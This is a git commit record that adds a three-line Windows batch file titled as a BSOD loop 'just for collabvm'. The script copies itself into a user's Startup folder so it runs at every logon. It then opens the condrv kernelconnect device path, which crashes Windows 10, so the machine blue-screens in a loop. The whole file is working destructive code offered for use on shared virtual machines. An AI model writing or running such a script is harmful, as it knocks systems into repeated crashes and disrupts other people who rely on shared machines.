b2ec846d6b50a856e77dd119df6de53047297a3a
Lol-cvm <81323182+Lol-cvm@users.noreply.github.com>
2021-03-26 13:50:20 +0200

    Create Windows 10 bsod loop (just for collabvm).bat

---
+++ Windows 10 bsod loop (just for collabvm).bat
@@ -0,0 +1,3 @@
+@echo off
+copy "Windows 10 bsod loop (just for collabvm).bat" C:\Users\Dartz\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+\\.\globalroot\device\condrv\kernelconnect
